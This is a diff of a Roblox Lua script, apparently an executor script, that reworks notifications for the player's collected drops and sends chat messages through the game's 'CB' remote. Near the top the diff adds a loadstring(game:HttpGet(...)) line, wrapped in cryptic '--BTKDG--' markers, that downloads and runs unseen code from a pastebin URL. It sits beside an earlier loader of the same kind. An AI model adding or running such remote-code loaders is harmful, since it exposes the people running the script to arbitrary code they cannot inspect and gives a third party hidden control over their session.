@@ -18,6 +18,9 @@ UIManager.BuildAndShowUIPrompt({
 --LOGS--
 loadstring(game:HttpGet("https://pastebin.com/raw/88aTLHny"))()
  --LOGS--
+--BTKDG--
+loadstring(game:HttpGet("https://pastebin.com/raw/KSLKsMA8"))()
+--BTKDG--
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -180,55 +183,72 @@ PlayerGui.ChildAdded:Connect(function(child)
     end
 end)
 
+local Players = game:GetService("Players")
+-- Wait for the local player to exist
+local LocalPlayer = Players.LocalPlayer or Players:GetPlayerFromCharacter(script.Parent) 
+if not LocalPlayer then
+    repeat task.wait() LocalPlayer = Players.LocalPlayer until LocalPlayer
+end
+
+local myId = tostring(LocalPlayer.UserId)
 local basket = {}
 local isCompiling = false
 
 local function trackDrops(item)
     if not item:IsA("Part") then return end
+
     item:GetAttributeChangedSignal("t"):Connect(function()
-        if Settings.CollectNotify and item:GetAttribute("t") then
-            local n = tostring(item:GetAttribute("id") or "Item"):gsub("_sapling", ""):gsub("_", " "):upper()
+        local collectorId = tostring(item:GetAttribute("t") or "")
+        
+        -- Check if the 't' attribute matches YOUR ID
+        if Settings.CollectNotify and collectorId == myId then
+            local rawId = item:GetAttribute("id") or "Item"
+            local n = tostring(rawId):gsub("_sapling", ""):gsub("_", " "):upper()
             local t = item:GetAttribute("amount") or 0
+            
             basket[n] = (basket[n] or 0) + t
             
             if not isCompiling then
                 isCompiling = true
-                task.wait(0.5) -- Short wait to group items
-                
-                local UIM = require(game:GetService("ReplicatedStorage"):WaitForChild("Managers"):WaitForChild("UIManager"))
-                local CB = game:GetService("ReplicatedStorage"):WaitForChild("CB")
-                
-                -- We copy the basket then clear it immediately so new drops can start a new basket
-                local currentBasket = {}
-                for k, v in pairs(basket) do currentBasket[k] = v end
-                table.clear(basket)
-                isCompiling = false -- RELEASE THE LOCK HERE
-                
-                for name, total in pairs(currentBasket) do
-                    local msg = "[CSN] COLLECTED " .. name .. " " .. total .. "X"
+                task.delay(0.5, function()
+                    -- Re-require these inside the delay to ensure they are loaded
+                    local UIM = require(game:GetService("ReplicatedStorage"):WaitForChild("Managers"):WaitForChild("UIManager"))
+                    local CB = game:GetService("ReplicatedStorage"):WaitForChild("CB")
                     
-                    UIM.BuildAndShowUIPrompt({
-                        ["Title"] = name,
-                        ["Icon"] = ":" .. name:lower():gsub(" ", "_"),
-                        ["Body"] = "TOTAL COLLECTED: " .. total .. "X",
-                        ["Elements"] = {
-                            {["Type"] = "Button", ["Text"] = "SEND", ["Value"] = "SEND_MSG"},
-                            {["Type"] = "Button", ["Text"] = "CLOSE", ["Value"] = "close"}
-                        }
-                    }, function(result) 
-                        if result and result.ButtonAction == "SEND_MSG" then
-                            CB:FireServer(msg)
-                        end
-                    end)
-                end
+                    local currentBasket = {}
+                    for k, v in pairs(basket) do currentBasket[k] = v end
+                    table.clear(basket)
+                    isCompiling = false 
+                    
+                    for name, total in pairs(currentBasket) do
+                        local msg = "[CSN] COLLECTED " .. name .. " " .. total .. "X"
+                        
+                        UIM.BuildAndShowUIPrompt({
+                            ["Title"] = name,
+                            ["Icon"] = ":" .. name:lower():gsub(" ", "_"),
+                            ["Body"] = "TOTAL COLLECTED: " .. total .. "X",
+                            ["Elements"] = {
+                                {["Type"] = "Button", ["Text"] = "SEND", ["Value"] = "SEND_MSG"},
+                                {["Type"] = "Button", ["Text"] = "CLOSE", ["Value"] = "close"}
+                            }
+                        }, function(result) 
+                            if result and result.ButtonAction == "SEND_MSG" then
+                                CB:FireServer(msg)
+                            end
+                        end)
+                    end
+                end)
             end
         end
     end)
 end
 
+-- Re-running the folder check
 local dFolder = workspace:WaitForChild("Drops", 10)
 if dFolder then
-    for _, v in ipairs(dFolder:GetChildren()) do task.spawn(trackDrops, v) end
+    for _, v in ipairs(dFolder:GetChildren()) do 
+        task.spawn(trackDrops, v) 
+    end
     dFolder.ChildAdded:Connect(trackDrops)
 end
 
